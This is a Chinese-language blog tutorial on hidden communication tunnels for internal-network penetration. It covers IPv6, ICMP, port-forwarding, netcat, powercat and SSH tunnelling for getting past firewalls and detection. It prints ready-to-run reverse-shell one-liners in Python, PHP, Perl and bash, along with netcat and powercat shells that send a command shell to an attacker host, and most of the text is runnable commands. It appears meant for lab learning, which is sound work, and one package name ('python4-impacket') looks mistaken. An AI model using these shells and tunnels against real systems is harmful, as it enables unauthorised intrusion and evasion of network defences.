---
title: 内网渗透-隧道隐藏
date: 2022-02-10
tags: 内网
categories: Technology
---

[toc]

# 隐藏通信隧道技术

当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否进出），该技术通常用于在访问受限的内网环境中完成内网之内、内网与公网之间安全、稳定的数据传输。

在最简单的情况下，两台主机之间数据的交换建立在TCP/IP协议之上，也就是说知道了IP、建立了TCP连接，那么两台主机便可以进行数据传输。

但在大多数情况下，内网的环境存在多种边界设备以及入侵检测装置的限制，它们会对主机间或者内网与外网之间通信的流量进行检测，如果存在异常就会进行拦截，这无疑给内网渗透增加了难度，而隐藏通信隧道技术就是为了绕过各种边界设备的封锁，从而完成主机间或内网与外网之间的通信。

# 常见隧道

网络层：IPV6隧道、ICMP隧道

传输层：TCP隧道、UDP隧道、端口转发

应用层：SSH隧道、HTTP(S)隧道、DNS隧道

## 网络层

### 1.IPV6隧道

>   工具：6tunnel（kali自带）
>
>   靶机：winserver2008
>
>   攻击机：kali

首先要开启靶机的IPV6

![image-20220210134112319](内网渗透-隧道隐藏/image-20220210134112319.png)

之后查看靶机的ipv6地址，假设为aaaa:bbbb:cccc:dddd

在kali：

```sh
sudo su
6tunnel -4 80 aaaa:bbbb:cccc:dddd%eth080
#将靶机的80端口（ipv6）转发到本地的80端口（ipv4）
```

之后访问本地的80端口就可访问目标机的服务

### 2.ICMP隧道

一般通信都需要端口的开启，ICMP则不需要开放任何端口。

渗透测试中，如果防火墙对各种上层协议(HTTP.HTTPS,DNS等)的数据包进行了封锁，那么我们可以尝试一下网管常常漏掉的ICMP协议包，我们可以将TCP数据包封装到ICMP数据包中，如果防火墙不对ICMP包进行拦截，那么我们便可以实现对防火墙的突破

#### icmpsh

>   工具：icmpsh
>
>   download：https://github.com/bdamele/icmpsh
>
>   需要python的impacket类库：apt-get install python4-impacket
>
>   由于icmpsh要代替系统本身的ping应答，所以要关闭一下系统的ping应答，否则工具将无法稳定运行
>
>   ```
>   sysctl -w net.ipv4.icmp_echo_ignore_all=1
>   ```

之后跑run.sh脚本即可，输入靶机与攻击机IP后会给出要在靶机上运行的指令

执行后即可回弹shell

#### pingtunnel

网络的拓扑：

```
攻击机：192.168.1.4
web服务：192.168.1.5
数据库服务器：192.168.1.2
```

可访问web服务，但不能访问数据库服务器；web服务器只能通过icmp访问数据库服务器。

>   工具：pingtunnel
>
>   make &make install

在web服务器上也要装，之后`ptunnel -x aaa`(在web服务器上开启一个密码为aaa的icmp隧道)

在攻击机上：`ptunnel -p 192.168.1.5 -lp 1080 -da 192.168.1.2 -dp 3389 -x aaa`

(当访问攻击机的1080端口时，数据库服务器3389端口的数据便会以web服务器为中转，通过刚刚搭建好的以aaa为密码的ICMP隧道传送到攻击机的1080端口上)

## 传输层

#### 1.端口转发

>   工具：lcx
>
>   download：https://github.com/yw9381/lcx

lcx的原理就是搭建Socket隧道，一个正常的Socket隧道必须具备两端：客户端、服务端，服务端开启监听端口，客户端传入服务端的IP与端口，主动与服务端连接

>   攻击机：192.168.1.2

在靶机上：`lcx.exe -slave 192.168.1.2 4444 127.0.0.1 3389`

(将本机的3389端口转发到攻击机的4444端口)

在攻击机上：`./portmap -m 2 -p1 4444 -h2 192.168.1.2 -p2 5555`

（将本地的4444端口接收的数据转发到5555端口）

然后访问本机的5555端口

```
kali下可：rdesktop "127.0.0.1:5555"
win下直接远程桌面链接：127.0.0.1:5555
```

#### 2.netcat

```sh
nc -help
-p 指定端口
-v 显示细节
-u 使用UDP传输协议
-l 监听模式
-w 设置超时时间
```

##### 获得shell

**正向shell**

正向连接使用频率较少，因为这种shell很容易被各种边界设备所拦截

靶机中：`nc -lvp 4444 -e /bin/sh`（把/bin/sh发送给请求本机4444端口的中断）

攻击机上：`nc 192.168.1.2 4444`

**反向shell**

受害及主动来连接攻击机，这种方法在渗透测试中更为常用，因为它可以突破许多边界设备的封锁

攻击机上：`nc -lvp 5555`

靶机上：	`nc 192.168.1.4 5555 -e /bin/sh`

这是在靶机上已经装了nc攻击，若没装的话，可使用其他来反弹shell：

###### 1.用pyhton反弹shell

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击机IP",攻击机监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

###### 2.php反弹shell

```php
php -r '$sock=fsockopen("攻击机ip",攻击机监听的端口);exec("/bin/bash -i <&3 >&3 2>&3");'
```

###### 3.perl反弹shell

```perl
perl -e 'use Socket;$i="攻击机ip";$p=攻击机监听端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

###### 4.bash反弹shell

```bash
bash -i >& /dev/tcp/192.168.1.4(攻击机ip)/6666 0>&1
将受害机上的输入与输出以TCP流的形式重定向到攻击机的6666端口
```

#### 3.Powercat

>   download：https://github.com/besimorhino/powercat

工具下载后需要导入powercat.ps1脚本后才可以正常使用powercat

执行

```powershell
Import-Module .\powercat.ps1
```

如果权限不够需要修改权限：

```powershell
Set-ExecutionPolicy RemoteSigned
```

部分参数：

```sh
-c 指定一个ip地址
-p 指定一个端口
-v 显示详情
-l 监听模式
-e 程序重定向
```

### 正向链接

```powershell
powercat -l -p 8888 -e cmd.exe -v
#这条命令的意思是把cmd.exe数据包发送给请求本机8888端口的主机
```

攻击机：

`nc 192.168.1.2 8888 -vv`

### 反向链接

攻击机先监听本机5555端口`nc -lpvv 5555`

靶机：

```powershell
powercat -c 192.168.1.4 -p 5555 -v -e cmd.exe
```

## 应用层

### 1.ssh

常见参数：

```sh
-C 压缩传输
-f 后台执行SSH
-N 建立静默连接
-g 允许远程主机连接本地用于转发的端口
-L 本地端口转发
-R 远程端口转发
-D 动态转发
-P 指定SSH端口
```

网络拓扑：

```
攻击机：192.168.1.4
web服务：192.168.1.5
数据库服务器：192.168.1.2

实验环境：攻击机无法访问数据库服务器，可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问

实验目标：通过本地端口转发，访问攻击机本地的5555端口便可以打开数据库服务器的远程桌面
```

#### 1.本地转发

在攻击机上：

`ssh -CfNg -L 5555:192.168.1.2:3389 root@192.168.1.5`(这条命令的意思就是攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机)

之后会输入web服务器的密码，由于是静默模式，可以本地查看5555端口是否被监听来检查通道的建立是否正常

`netstat -tulnp | grep "5555"`

接下来攻击机访问本机5555端口即可打开数据库的远程桌面：

```sh
rdesktop 127.0.0.1:5555
```

#### 2.远程转发

在web服务器上：

`ssh -CfNg -R 5555:192.168.1.2:3389 root@192.168.1.4`（这条命令的意思是此时的web服务器虽然依旧是跳板，但是无论是连接数据库服务器的3389还是去连接攻击机的5555都是web服务器主动发起）

之后输入攻击机的密码，在攻击机访问本地的5555端口

```
rdesktop 127.0.0.1:5555
```

#### 3.动态转发

在攻击机上：

`ssh -CfNg -D 6000 root@192.168.1.5`（搭建了一个动态的SOCKS代理通道）

之后输入web服务器的密码，查看是否链接成功`netstat -tulnp | grep ":6000"`

然后在本地浏览器设置好socks代理就可访问数据服务器上开放的web服务

